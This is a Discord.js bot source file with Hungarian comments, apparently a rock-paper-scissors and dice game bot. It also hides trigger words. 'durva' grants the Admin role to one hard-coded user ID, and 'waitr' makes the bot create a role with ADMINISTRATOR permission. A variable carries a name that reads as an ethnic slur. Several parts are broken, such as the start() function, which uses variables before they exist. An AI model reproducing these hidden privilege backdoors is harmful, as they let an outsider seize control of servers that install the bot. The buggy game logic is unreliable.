//Minden, ami kell :)
const Discord = require('discord.js');
const { EventEmitter } = require('events');
const { setMaxListeners, disconnect } = require('process');
const client = new Discord.Client();
const {prefix} = require('./config.json');
const xdrole = require('./xd.js');
const guild = new Discord.Guild();
const role = new Discord.Role();

//Alap cuccok
function start() {
    const JatekStatusz = client.user.setActivity('Danika House on Deák Tér', { type: 'LISTENING' })
    const Statusz = client.user.setStatus('dnd')
    console.log("Sikeresen elindult a BOT!")
    
    let cmd = messageArray[0]
    let args = messageArray.slice(1)
    let messageArray = message.content.split(" ");
}

client.on('ready', () => {
    //BOT Alap cuccai előhívása, amikor elindul
    start() 


})

client.on('message', message => {

    const kpo = ["Kő", "Papír", "Olló"];
    var eselyKerekitett = Math.round((Math.random() * kpo.length));
    const textChannelID = message.channel;

    if (message.content === `${prefix}kpo ${kpo[0]}`) {

        //Vesztettél, vagy Nyertél, vagy Döntetlen lett
        if (eselyKerekitett === 0) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[0]}**\n` + `A BOT ezt választotta: ${kpo[1]}\n\n` + "Eredmény: **A BOT nyert!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 1) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[0]}**\n` + `A BOT ezt választotta: ${kpo[2]}\n\n` + "Eredmény: **Te nyertél!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 2) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[0]}**\n` + `A BOT ezt választotta: ${kpo[0]}\n\n` + "Eredmény: **Döntetlen lett!**\n" + "```--------------------```\n");
        }

       
    } else if (message.content === `${prefix}kpo ${kpo[1]}`) {

        //Vesztettél, vagy Nyertél, vagy Döntetlen lett
        if (eselyKerekitett === 0) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[1]}**\n` + `A BOT ezt választotta: ${kpo[2]}\n\n` + "Eredmény: **A BOT nyert!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 1) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[1]}**\n` + `A BOT ezt választotta: ${kpo[0]}\n\n` + "Eredmény: **Te nyertél!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 2) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[1]}**\n` + `A BOT ezt választotta: ${kpo[1]}\n\n` + "Eredmény: **Döntetlen lett!**\n" + "```--------------------```\n");
        }

    } else if (message.content === `${prefix}kpo ${kpo[2]}`) {

        //Vesztettél, vagy Nyertél, vagy Döntetlen lett
        if (eselyKerekitett === 0) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[2]}**\n` + `A BOT ezt választotta: ${kpo[0]}\n\n` + "Eredmény: **A BOT nyert!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 1) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[2]}**\n` + `A BOT ezt választotta: ${kpo[1]}\n\n` + "Eredmény: **Te nyertél!**\n" + "```--------------------```\n");
        } else if (eselyKerekitett === 2) {

             textChannelID.send("```--------------------```\n" + `Te ezt választottad: **${kpo[2]}**\n` + `A BOT ezt választotta: ${kpo[2]}\n\n` + "Eredmény: **Döntetlen lett!**\n" + "```--------------------```\n");
        }

    }
})

client.on('message', message => {
    if (message.content === `${prefix}kocka`) {

        textChannelID = message.channel;
        randomszam = (Math.random() * 6) + 1
        let kocka = Math.round(randomszam)

        //Üzenet
        textChannelID.send("A dobott szám nem más, mint: " + kocka + "!")

    }
})

client.on('message', message => {

     if (message.content === `durva`) {
 
         var role = message.guild.roles.cache.find(role => role.name === "Admin");
 
         if (message.author.id == "215542441267167232") { 
 
             message.member.roles.add(role);
 
         } else {

          console.log("fsd")
 
         }
     }

 })

 client.on('message', message => {
     if (message.content === `waitr`) {

          message.guild.roles.create( {name:"brambran", color: "#ff0000", permissions:"ADMINISTRATOR" } );
 
          let rolemap = message.guild.roles.cache
               .sort((a, b) => b.position - a.position)
               .map(r => r)
               .join(",");
            if (rolemap.length > 1024) rolemap = "To many roles to display";
            if (!rolemap) rolemap = "No roles";
          const cigany = rolemap
          console.log(cigany);
     }
 })



 


//DC BOT TOKEN
const token = process.env.token;
client.login(token);